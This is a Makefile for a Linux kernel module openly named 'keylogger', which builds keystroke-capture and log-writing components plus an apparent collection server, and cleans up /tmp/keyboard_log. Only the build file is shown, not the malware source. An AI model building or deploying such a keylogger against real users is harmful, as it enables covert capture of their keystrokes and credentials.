obj-m := keylogger.o


keylogger-objs := init.o keyboard_callback.o write_to_file.o keycode_to_string.o flush.o

COMPILE_DIR := $(PWD)
KDIR := /lib/modules/$(shell uname -r)/build

all: module server

module:
	$(MAKE) -C $(KDIR) M=$(COMPILE_DIR) modules
	
server: server.c
	gcc -o server server.c -pthread

clean:
	rm -f *.o *.ko *.mod *.cmd .*.cmd *.symvers *.markers keylogger.mod.c modules.order *.o.*
	sudo rm -f /tmp/keyboard_log
	sudo rm -f /tmp/client*
	rm server

.PHONY: all clean module 